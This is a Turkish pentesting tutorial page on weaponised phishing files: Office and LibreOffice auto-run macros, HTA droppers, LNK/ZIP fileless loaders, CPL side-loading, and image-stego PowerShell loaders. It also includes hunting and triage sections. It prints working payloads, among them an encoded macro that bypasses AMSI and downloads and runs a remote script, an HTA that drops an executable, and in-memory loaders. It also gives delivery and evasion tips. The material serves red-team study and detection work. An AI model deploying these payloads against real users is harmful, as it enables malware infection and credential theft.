# Phishing Dosyaları ve Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısı tanımlama biçiminde gerçekleştirilir. Veri yapısı tanımlama sırasında herhangi bir hata oluşursa analiz edilen dosya açılmaz.

Makro içeren Word dosyaları genellikle `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro çalıştırma özelliklerini korumak mümkündür.\
Örneğin, RTF dosyaları tasarımları gereği makroları desteklemez; ancak RTF olarak yeniden adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenir ve makro çalıştırabilir.\
Aynı dahili yapılar ve mekanizmalar Microsoft Office Suite'teki tüm yazılımlar için geçerlidir (Excel, PowerPoint vb.).

Bazı Office programlarında hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX dosyaları, makro içeren uzak bir şablona başvuruyorsa (File –Options –Add-ins –Manage: Templates –Go), makroları da “çalıştırabilir”.

### Harici Görüntü Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture ve **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Harici Görüntü Yükleme: Şuraya gidin: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Makro Arka Kapısı

Belgeden rastgele kod çalıştırmak için makroları kullanmak mümkündür.

#### Otomatik yükleme işlevleri

Ne kadar yaygınlarsa AV'nin onları algılama olasılığı da o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Makro Kod Örnekleri

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Metadata'yı manuel olarak kaldırma

**File > Info > Inspect Document > Inspect Document** yolunu izleyerek Document Inspector'ı açın. **Inspect**'e, ardından **Document Properties and Personal Information** yanındaki **Remove All**'a tıklayın.

#### Doc uzantısı

İşiniz bittiğinde **Save as type** açılır menüsünü seçin ve formatı **`.docx`**'ten Word 97-2003 **`.doc`**'a değiştirin.\
Bunu yapın, çünkü **`.docx` içine macro kaydedemezsiniz** ve macro özellikli **`.docm`** uzantısının **kötü bir ünü** vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta gateway'leri bu dosyaları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.

#### Malicious Macros Generators

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT otomatik çalıştırma macro'ları (Basic)

LibreOffice Writer belgelerine Basic macro'ları eklenebilir ve macro, **Open Document** olayına bağlanarak dosya açıldığında otomatik olarak çalıştırılabilir (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şöyledir:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

String içindeki çift tırnaklara (`""`) dikkat edin – LibreOffice Basic, gerçek tırnakları kaçışlamak için bunları kullanır; bu nedenle `...==""")` ile biten payload'larda hem içteki komut hem de Shell argümanı dengeli kalır.

Teslim ipuçları:

- `.odt` olarak kaydedin ve makroyu belge olayına bağlayın; böylece belge açılır açılmaz çalışır.
- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` gereklidir; böylece ek olarak dosya adı dizgesi değil, dosyanın baytları gönderilir). Bu, doğrulama yapmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını istismar ederken kritik önem taşır.

## HTA Dosyaları

HTA, **HTML ve betik dillerini (VBScript ve JScript gibi) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcının güvenlik modelindeki kısıtlamalara tabi olmadan, "tamamen güvenilen" bir uygulama olarak çalışır.

HTA, genellikle **Internet Explorer** ile birlikte **yüklenen** `mshta.exe` kullanılarak çalıştırılır; bu nedenle `mshta`, IE'ye **bağlıdır**. IE kaldırılmışsa HTA'lar çalıştırılamaz.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## NTLM Authentication'ı Zorlama

**NTLM authentication'ı "uzaktan" zorlamanın** birkaç yolu vardır. Örneğin, kullanıcının erişeceği e-postalara veya HTML sayfalarına **görünmez görseller** ekleyebilirsiniz (HTTP MitM de olabilir mi?). Ya da kurbanın **klasörü açmasıyla** bir **authentication** işlemini **tetikleyecek** dosya **adreslerini** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya authentication'ı çalmakla kalmayıp **NTLM relay saldırıları da gerçekleştirebileceğinizi** unutmayın:

- [**NTLM Relay saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (sertifikalara NTLM relay)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP İçine Gömülü Payload'lar (fileless zincir)

Son derece etkili kampanyalarda, iki meşru yem belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderilir. Buradaki numara, asıl PowerShell loader'ın ZIP'in ham baytlarında benzersiz bir işaretleyiciden sonra saklanması ve .lnk'nin bu loader'ı çıkarıp tamamen bellekte çalıştırmasıdır.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner'ının uyguladığı tipik akış:

1) Orijinal ZIP'i yaygın konumlarda bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst dizini.
2) ZIP baytlarını okuyun ve sabit kodlanmış bir işaretleyici bulun (ör. xFIQCV). İşaretleyiciden sonraki her şey gömülü PowerShell payload'ıdır.
3) ZIP'i %ProgramData%'ya kopyalayın, orada çıkarın ve meşru görünmesi için yem .docx dosyasını açın.
4) Geçerli işlem için AMSI'yi atlatın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Sonraki aşamanın obfuscation'ını kaldırın (ör. tüm # karakterlerini silin) ve bellekte çalıştırın.

Gömülü aşamayı çıkarıp çalıştırmak için örnek PowerShell iskeleti:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notlar
- Teslimat çoğunlukla güvenilir PaaS alt alan adlarını (örn. *.herokuapp.com) kötüye kullanır ve payload'ları koşula bağlayabilir (IP/UA'ya göre zararsız ZIP'ler sunar).
- Sonraki aşama, disk üzerindeki izleri en aza indirmek için genellikle base64/XOR shellcode'un şifresini çözer ve bunu Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır.

Aynı zincirde kullanılan kalıcılık
- Microsoft Web Browser denetiminin COM TypeLib hijacking yöntemiyle ele geçirilmesi; böylece IE/Explorer veya bu denetimi gömen herhangi bir uygulama payload'u otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntıları ve kullanıma hazır komutları burada görebilirsiniz:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Avcılık/IOCs
- Arşiv verisinin sonuna eklenmiş ASCII işaretçi dizgesini (örn. xFIQCV) içeren ZIP dosyaları.
- ZIP dosyasını bulmak ve dikkat dağıtıcı bir belgeyi açmak için üst/ kullanıcı klasörlerini tarayan .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla AMSI'ye müdahale.
- Güvenilir PaaS alan adlarında barındırılan bağlantılarla sonlanan, uzun süren iş yazışmaları.

## Önce LNK ile dikkat dağıtıcı belgeyi açma → zamanlanmış görevle kalıcılık → güvenilir CPL side-loading

Tekrarlanan başka bir örüntü, arka planda gerçek zinciri hazırlarken zararsız bir yem belgeyi hemen açan **belge gibi görünen bir `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>

Gözlemlenen iş akışı:
1. Kısayol **PDF kılığına girer** ve gizlenmiş bir PowerShell downloader'ı başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, belirgin belirteçleri (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) parçalara ayırır; böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan basit tespitler komutu gözden kaçırır.
3. Stager önce **dikkat dağıtıcı belgeyi indirir**, kurban için açar ve ardından arka planda kötü amaçlı dosyaları yeniden oluşturur.
4. Payload'lar **anlamsız uzantılarla** yazılabilir ve ardından dolgu karakterleri kaldırılarak yeniden adlandırılabilir; böylece bariz `.exe` / `.cpl` izlerinin ortaya çıkması geciktirilir.
5. Kalıcılık, kullanıcı tarafından yazılabilir bir yoldan güvenilir bir host binary'si başlatan **dakika bazlı bir zamanlanmış görevle** sağlanır.

Bu örüntüye ilişkin temel avcılık ipuçları:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Tanımaya değer bir staging düzeni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci aşama neden gizlidir

Rapid7 vaka incelemesinde, zamanlanmış görev **`Fondue.exe`** dosyasını tekrar tekrar `C:\Users\Public\` konumundan başlatıyordu. **`APPWIZ.cpl`** dosyası yanına bırakılıp **`RunFODW`** dışa aktarıldığından, güvenilir Microsoft binary’si meşru sistem kopyası yerine saldırganın CPL dosyasını side-load ediyordu.

CPL daha sonra:
- `C:\Windows\Tasks\editor.dat` konumundaki bir **AES-256-CBC** blob’unu okur
- Blob’u **Windows CNG / `bcrypt.dll`** aracılığıyla çözer
- Yürütülebilir bellek ayırır ve çözülen shellcode’u kopyalar
- Shellcode işaretçisini **`EnumUILanguagesW`** için callback olarak geçirerek dolaylı biçimde yürütür

Bu son adım ayrıca araştırılmaya değer: Malware, doğrudan `((void(*)())buf)()` atlamasından kaçınmak için genellikle yürütmeyi aktarmak amacıyla **callback alan meşru bir WinAPI**’yi kötüye kullanır.

Bu kampanyada çözülen payload **Donut** shellcode’uydu. Bu shellcode son PE’yi tamamen belleğe map etti ve yürütmeyi devretmeden önce geçerli süreçte **AMSI/WLDP/ETW**’yi patch’ledi. Side-loading ve bellekte çalışan post-processing hakkında daha ayrıntılı notlar için bkz.:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pratik araştırma ipuçları:
- Ardından görünür bir sahte belge açan `.lnk` dosyasının `powershell.exe` veya `conhost.exe` başlatması.
- **`C:\Users\Public\`** konumuna indirilen ve hemen ardından anlamsız uzantılardan yeniden adlandırılan kısa ömürlü dosyalar.
- **Kullanıcının yazabildiği dizinlerden** çalıştırılan `GoogleErrorReport` gibi sıradan isimli zamanlanmış görevler.
- Güvenilir binary’lerin aynı sistem dışı dizindeki **`.cpl` / `.dll`** dosyalarını yüklemesi.
- **`C:\Windows\Tasks\`** altında yazılan ve ardından side-load edilen modül tarafından okunan Base64 metin blob’ları.

## Görüntülerde steganografiyle ayrılmış payload’lar (PowerShell stager)

Güncel loader zincirleri, Base64 PowerShell stager’ını çözüp çalıştıran gizlenmiş bir JavaScript/VBS sunar. Bu stager bir görüntü (genellikle GIF) indirir. Görüntünün içinde, benzersiz başlangıç/bitiş işaretleyicileri arasında düz metin olarak gizlenmiş Base64 kodlu bir .NET DLL bulunur. Script bu ayraçları arar (gerçek saldırılarda görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, Base64’ten byte dizisine çözer, assembly’yi belleğe yükler ve bilinen bir giriş metodunu C2 URL’siyle çağırır.<sup>[[5]](#references)</sup>

İş Akışı
- Aşama 1: Arşivlenmiş JS/VBS dropper → gömülü Base64’ü çözer → `-nop -w hidden -ep bypass` ile PowerShell stager’ını başlatır.
- Aşama 2: PowerShell stager → görüntüyü indirir, işaretleyicilerle ayrılmış Base64’ü çıkarır, .NET DLL’yi belleğe yükler ve metodunu (ör. VAI) C2 URL’si ve seçeneklerle çağırır.
- Aşama 3: Loader son payload’ı alır ve genellikle process hollowing yoluyla güvenilir bir binary’ye (çoğunlukla MSBuild.exe) inject eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve güvenilir araçları proxy olarak yürütme hakkında daha fazla bilgi için bkz.:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir görüntüden DLL çıkarıp bellekte bir .NET metodunu çağırmak için PowerShell örneği:

<details>
<summary>PowerShell stego payload extractor and loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notlar
- Bu, ATT&CK T1027.003’tür (steganography/marker-hiding).<sup>[[6]](#references)</sup> İşaretleyiciler kampanyalar arasında değişir.
- Assembly yüklenmeden önce genellikle AMSI/ETW bypass ve string deobfuscation uygulanır.
- Tehdit avcılığı: İndirilen görselleri bilinen ayraçlar için tarayın; görsellere erişip hemen Base64 blob’ları çözen PowerShell süreçlerini belirleyin.

Ayrıca stego araçlarına ve carving tekniklerine bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Tekrarlanan bir ilk aşama, arşiv içinde teslim edilen küçük ve yoğun biçimde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 dizgesini çözmek ve HTTPS üzerinden sonraki aşamayı başlatmak üzere PowerShell’i `-nop -w hidden -ep bypass` ile çalıştırmaktır.<sup>[[5]](#references)</sup>

İskelet mantık (soyut):
- Kendi dosya içeriğini oku
- Gereksiz dizgeler arasındaki Base64 blob’u bul
- ASCII PowerShell’e çöz
- `wscript.exe`/`cscript.exe` ile `powershell.exe` çağırarak çalıştır

Tehdit avcılığı ipuçları
- Komut satırında `-enc`/`FromBase64String` içeren `powershell.exe` süreçlerini başlatan, arşivlenmiş JS/VBS ekleri.
- Kullanıcı temp dizinlerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe` süreçleri.

## MSC belgeleri yürütme kapsayıcıları olarak (GrimResource)

Microsoft Management Console dosyaları (`.msc`), normalde `mmc.exe` ile açılan XML konsol tanımlarıdır. **GrimResource**, eski bir XSS primitive’i içeren `apds.dll` kaynağına yapılan `StringTable` başvurusunu kötüye kullanır; böylece kullanıcı hazırlanmış konsolu açtığında JavaScript `mmc.exe` içinde çalışır. Gözlemlenen örneklerde, alışılmış Office macro yolunu kullanmadan .NET payload’ı başlatmak için `transformNode` tabanlı obfuscation ile **DotNetToJScript** birlikte kullanılmıştır.<sup>[[9]](#references)</sup>

Statik triage sırasında güvenilmeyen bir MSC dosyasını metin olarak inceleyin ve **dosyaya çift tıklamayın**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Yüksek sinyalli runtime göstergeleri arasında `mmc.exe`'nin CLR veya script bileşenlerini yüklemesi, ağ bağlantıları kurması ya da `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` veya beklenmeyen bir executable başlatması yer alır. Format meşru olduğundan, detections her MSC dosyasını engellemek yerine **kaynak + şüpheli XML/script içeriği + `mmc.exe` davranışı** arasında korelasyon kurmalıdır.<sup>[[9]](#references)</sup>

## PDF/QR yönlendiricileri ve payload kısıtlama

Bir PDF'nin işe yaraması için exploit içermesi gerekmez. Yakın tarihli kampanyalarda, zararsız görünen belgelere **QR kodu veya sıradan bir bağlantı** yerleştiriliyor, tarayıcı oturumu e-posta denetimlerinden uzaklaştırılıyor ve hedef, alıcının adresine göre kişiselleştiriliyor. Microsoft, 2025'te QR URL'leri her alıcıya özel olan ve RaccoonO365 kimlik bilgisi toplama altyapısına yönlendiren PDF'leri belgeledi; paralel bir zincirde ise IP/ortam kısıtlaması kullanılarak seçili ziyaretçilere JavaScript/MSI yolu, tarayıcılara veya izin verilmeyen istemcilere ise zararsız bir PDF sunuldu.<sup>[[10]](#references)</sup>

Hem PDF eylemlerini hem de görüntülenen QR kodlarını inceleyin. QR kodu, dışa aktarılabilir bir görüntü olarak saklanmak yerine vektör olarak çizilmiş olabilir; bu nedenle gömülü görüntüleri çıkarmanın yanı sıra her sayfayı rasterleştirin:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

İzole bir analiz sisteminden, kimlik doğrulaması yapmadan çözümlenmiş hedefleri ve yönlendirmeleri inceleyin. Yararlı av özellikleri arasında gövdesi neredeyse boş, yalnızca QR kodu içeren PDF'ler; sorgu parametresine gömülü alıcı e-posta adresi; güvenilir barındırma hizmetleri üzerinden yapılan birden fazla yönlendirme ve IP, coğrafi konum, çerezler, referrer veya user agent'a göre döndürülen farklı içerikler bulunur. Tek bir sandbox isteği yalnızca yem içeriği alabileceğinden, istekleri kontrollü profillerle karşılaştırın.<sup>[[10]](#references)</sup>

## NTLM hash'lerini çalmak için Windows dosyaları

**NTLM kimlik bilgilerini çalınabilecek yerler** hakkındaki sayfaya bakın:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice makrosu → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Kampanyası: ABD şirketlerini hedef alan sofistike bir phishing saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Çin temalı bir loader zinciri üzerinden Dropping Elephant'ın tradecraft'ini izleme](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [TypeLib'i ele geçirme – Yeni COM kalıcılık tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader çeşitli infostealer'lar yayıyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografi (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Güvenilir geliştirici yardımcı programları proxy yürütmesi: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: İlk erişim ve kaçınma için Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Tehdit aktörleri, vergi temalı phishing kampanyaları yürütmek için vergi döneminden yararlanıyor](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
